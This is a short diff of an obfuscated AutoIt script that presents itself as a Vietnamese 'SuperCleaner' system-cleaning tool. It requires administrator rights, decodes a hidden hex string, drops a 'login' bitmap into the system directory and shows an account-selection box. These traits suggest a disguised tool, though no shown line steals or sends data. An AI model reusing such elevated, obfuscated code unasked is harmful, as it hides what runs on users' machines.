@@ -1,4 +1,4 @@
-#RequireAdmin
+﻿#RequireAdmin
 Global Const $0 = + 4294967293
 Global Const $1 = 16
 Global Const $2 = 3
@@ -679,7 +679,7 @@ ConsoleWrite ( $2J )
 Global $2K = _XD ( )
 Global $2L , $2M
 _XM ( _XC ( "0x7C0077007C007100610076007E0068007D007600" , "NG" ) )
-FileInstall ( "C:\Users\Admin\Desktop\tool\Image\screenshot4.bmp" , @SystemDir & "\LCF\" & "dangnhap.bmp" )
+FileInstall ( "screenshot4.bmp" , @SystemDir & "\LCF\" & "dangnhap.bmp" )
 $2N = GUICreate ( "SuperCleaner - Dọn dẹp hệ thống" , 230 , 105 )
 GUICtrlCreateLabel ( "Tài khoản:" , 10 , 15 , 70 , 20 )
 $2O = GUICtrlCreateCombo ( "" , 80 , 10 , 130 , 25 , $2 )
